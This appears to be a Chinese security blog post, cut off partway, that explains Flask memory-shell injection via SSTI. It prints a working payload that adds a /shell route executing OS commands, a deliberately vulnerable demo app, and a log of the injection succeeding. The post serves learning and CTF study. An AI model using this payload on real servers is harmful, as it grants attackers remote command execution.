@@ -1,0 +1,418 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="你学SSTI不学内存马？"><title>浅析flask内存马</title><link rel=canonical href=https://baozongwi.xyz/p/flask-memory-shell-analysis/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="浅析flask内存马"><meta property='og:description' content="你学SSTI不学内存马？"><meta property='og:url' content='https://baozongwi.xyz/p/flask-memory-shell-analysis/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='姿势'><meta property='article:tag' content='flask'><meta property='article:published_time' content='2024-09-02T11:03:56+00:00'><meta property='article:modified_time' content='2024-09-02T11:03:56+00:00'><meta name=twitter:title content="浅析flask内存马"><meta name=twitter:description content="你学SSTI不学内存马？"><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#老payload2022年之前>老payload(2022年之前)</a></li><li><a href=#分析老payload>分析老payload</a></li><li><a href=#demo老马>demo老马</a></li><li><a href=#新马>新马</a><ol><li><a href=#装饰器>装饰器</a><ol><li><a href=#before_request>before_request()</a></li><li><a href=#after_request>after_request()</a></li></ol></li><li><a href=#hook函数>hook函数</a><ol><li><a href=#teardown_request>teardown_request</a></li><li><a href=#errorhandler>errorhandler</a></li></ol></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/flask-memory-shell-analysis/>浅析flask内存马</a></h2><h3 class=article-subtitle>你学SSTI不学内存马？</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-09-02T11:03:56Z>Sep 02, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 527 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-前言>0x01 前言</h1><p>flask中的SSTI注入或许是个好姿势，但是我能不能<code>getshell</code>呢,之前经常阅读联队写的大赛WP,<strong>&ldquo;写个脚本打入内存马&rdquo;</strong>，好高级，好想学，那今天我来看看这到底是个什么乾坤</p><h1 id=0x02-question>0x02 question</h1><p>flask现在已经更新换代了，但是我觉得仍然值得学习，那么先从老版本内存马<code>payload</code>看起来吧</p><h2 id=老payload2022年之前>老payload(2022年之前)</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;eval&#39;</span><span class=p>](</span><span class=s2>&#34;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)).read())&#34;</span><span class=p>,{</span><span class=s1>&#39;_request_ctx_stack&#39;</span><span class=p>:</span><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;_request_ctx_stack&#39;</span><span class=p>],</span><span class=s1>&#39;app&#39;</span><span class=p>:</span><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;current_app&#39;</span><span class=p>]})</span>
+</span></span></code></pre></td></tr></table></div></div><p>一看除了导入方法搞了一个<code>cmd</code>参数<code>RCE</code>之外还是挺多看不懂的,写成py慢慢看</p><h2 id=分析老payload>分析老payload</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;eval&#39;</span><span class=p>](</span>
+</span></span><span class=line><span class=cl>    <span class=s1>&#39;&#39;&#39;app.add_url_rule(
+</span></span></span><span class=line><span class=cl><span class=s1>        &#39;/shell&#39;,
+</span></span></span><span class=line><span class=cl><span class=s1>        &#39;shell&#39;,
+</span></span></span><span class=line><span class=cl><span class=s1>        lambda:__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)).read()
+</span></span></span><span class=line><span class=cl><span class=s1>    )
+</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;_request_ctx_stack&#39;</span><span class=p>:</span><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;_request_ctx_stack&#39;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;app&#39;</span><span class=p>:</span><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;current_app&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=p>})</span>
+</span></span></code></pre></td></tr></table></div></div><p>首先第一行引用eval方法，这个人尽皆知吧？</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;app.add_url_rule(
+</span></span></span><span class=line><span class=cl><span class=s1>        &#39;/shell&#39;,
+</span></span></span><span class=line><span class=cl><span class=s1>        &#39;shell&#39;,
+</span></span></span><span class=line><span class=cl><span class=s1>        lambda:__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)).read()
+</span></span></span><span class=line><span class=cl><span class=s1>    )
+</span></span></span><span class=line><span class=cl><span class=s1>    &#39;&#39;&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><blockquote><p>add_url_rule()是 Flask 框架中一个核心的方法，用于手动添加 URL 路由规则。它允许开发者定义哪些 URL（即路由）应该调用哪些视图函数，并为这些路由指定处理 HTTP 请求的方法（如 GET、POST 等）。</p></blockquote><ul><li><strong>动态路由</strong>：当需要动态生成多个路由时，使用 <code>app.add_url_rule()</code> 可以更加灵活。</li><li><strong>模块化应用</strong>：在模块化 Flask 应用中，你可能希望在模块或蓝图中手动注册路由。</li><li><strong>路由的批量定义</strong>：可以在循环或其他控制结构中使用 <code>app.add_url_rule()</code> 批量添加路由。</li></ul><p>由于<code>app</code>是当前flask的默认实例(当前对象),那么且为动态可增加路由，所以在这里我们应该可以知道，内存马的原理应该是<strong>动态添加路由</strong>来实现自己想要的</p><p>再者深入<code>add_url_rule</code>到底参数是干啥的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>app</span><span class=o>.</span><span class=n>add_url_rule</span><span class=p>(</span><span class=n>rule</span><span class=p>,</span> <span class=n>endpoint</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>view_func</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>provide_automatic_options</span><span class=o>=</span><span class=kc>None</span><span class=p>,</span> <span class=n>options</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><blockquote><p><strong><code>rule</code></strong>: 定义路由,即客户端访问的路径。</p><p><strong><code>endpoint</code></strong>: 路由的端点名称，是一个标识符，用于在 Flask 内部引用这个路由。</p><p><strong><code>view_func</code></strong>: 处理这个路由请求的视图函数，当客户端访问这个路径时，会调用这个函数。</p><p><strong><code>provide_automatic_options</code></strong>: 一个布尔值，指示是否自动生成 HTTP OPTIONS 请求的处理函数。(默认为true)</p><p><strong><code>options</code></strong>: 其他的可选参数，比如 <code>methods</code>，定义允许的 HTTP 方法。</p></blockquote><p>那么理解了参数,这个<code>lambda</code>又是个啥(<del>菜鸡勿怪</del>)</p><p>通过自己的理解，<code>lambda</code>可以说成是一个包含<code>payload</code>的参数,但是他是一个匿名函数，自己写代码的时候可能是很简洁，但是如果出现<code>bug</code>的话并不是那么好<code>debug</code></p><p>那么来到这里</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>_request_ctx_stack</span><span class=o>.</span><span class=n>top</span>
+</span></span><span class=line><span class=cl><span class=c1>#这个东西是啥</span>
+</span></span></code></pre></td></tr></table></div></div><p>这里我们需要了解一下flask的上下文机制</p><blockquote><p><strong>请求</strong>:与每个 HTTP 请求相关联，包含了与该请求相关的所有数据，如 <code>request</code>、<code>session</code> 等。每次请求达到时创建,请求结束之后销毁</p><p><strong>应用</strong>:其与应用实例(app)相关,包含应用范围内的全局数据，我们所遇到的的<code>current_app</code>就是这种。在应用开始时创建，并在应用终止时销毁</p></blockquote><p><code>_request_ctx_stack</code>是<code>flask</code>自带的栈,栈是一种后进先出（LIFO, Last In, First Out）的数据结构，最后进入栈的元素最先被弹出。讲到这里是不是有点明白为啥用<code>top</code>,而不是<code>bottom</code>,<code>_request_ctx_stack.top</code>跟踪我们最后推入栈的元素，也就是<code>cmd</code></p><p>最后通过局部变量字典传入他们内置的即可调用啦</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;_request_ctx_stack&#39;</span><span class=p>:</span><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;_request_ctx_stack&#39;</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;app&#39;</span><span class=p>:</span><span class=n>url_for</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;current_app&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=demo老马>demo老马</h2><p>那么搞个环境试试?</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template_string</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello_world</span><span class=p>():</span>  <span class=c1># put application&#39;s code here</span>
+</span></span><span class=line><span class=cl>    <span class=n>person</span> <span class=o>=</span> <span class=s1>&#39;bao&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>person</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>template</span> <span class=o>=</span> <span class=s1>&#39;&lt;h1&gt;Hi, </span><span class=si>%s</span><span class=s1>.&lt;/h1&gt;&#39;</span> <span class=o>%</span> <span class=n>person</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>template</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>emm</code>,不出意外的报错了,报错原因</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>_check_setup_finished</span><span class=p>(</span><span class=bp>self</span><span class=p>,</span> <span class=n>f_name</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=bp>self</span><span class=o>.</span><span class=n>_got_first_request</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>raise</span> <span class=ne>AssertionError</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=sa>f</span><span class=s2>&#34;The setup method &#39;</span><span class=si>{</span><span class=n>f_name</span><span class=si>}</span><span class=s2>&#39; can no longer be called on the application. &#34;</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;It has already handled its first request, any changes will not be applied consistently.&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=s2>&#34;Make sure all imports, decorators, functions, etc. needed to set up the application are done before running it.&#34;</span>
+</span></span><span class=line><span class=cl>        <span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>他进行了设置不允许在中途添加路由了</p><p>那么我们换一下版本来重新实验(今天必须把这个玩意整明白了)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>#先创建文件夹
+</span></span><span class=line><span class=cl><span class=k>cd</span> C:\Users\baozongwi\Desktop\test
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>python -m venv venv
+</span></span><span class=line><span class=cl>venv\Scripts\activate
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>pip install flask==2.1.0
+</span></span><span class=line><span class=cl>pip install flask-login==0.6.0
+</span></span><span class=line><span class=cl>pip install werkzeug==2.0.3
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>python app.py
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>#退出环境并删除
+</span></span><span class=line><span class=cl>deactivate
+</span></span><span class=line><span class=cl><span class=k>rmdir</span> /s /q venv
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>http://127.0.0.1:5000/?name={{url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,&#39;whoami&#39;)).read())&#34;,{&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]})}}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>响应:
+</span></span><span class=line><span class=cl>127.0.0.1 - - [02/Sep/2024 12:24:26] &#34;GET /?name={{url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%27whoami%27)).read())%22,{%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]})}} HTTP/1.1&#34; 200 -
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/flask-memory-shell-analysis/QQ20240902-122523.png width=1070 height=753 loading=lazy alt=1></p><p>成功打入嘻嘻嘻嘻嘻嘻，我太开心啦</p><h2 id=新马>新马</h2><p>介于时代已经变了，我们如何应对呢</p><p>既然我们已经知道了打入内存马的原理是<strong>添加路由</strong>，那么我们去网上查找一下那些函数可以添加路由不就行了，我真棒棒</p><p>首先实验环境</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>flask</span> <span class=kn>import</span> <span class=n>Flask</span><span class=p>,</span> <span class=n>request</span><span class=p>,</span> <span class=n>render_template_string</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=n>Flask</span><span class=p>(</span><span class=vm>__name__</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hello_world</span><span class=p>():</span>  <span class=c1># put application&#39;s code here</span>
+</span></span><span class=line><span class=cl>    <span class=n>person</span> <span class=o>=</span> <span class=s1>&#39;bao&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>person</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>args</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;name&#39;</span><span class=p>)</span>
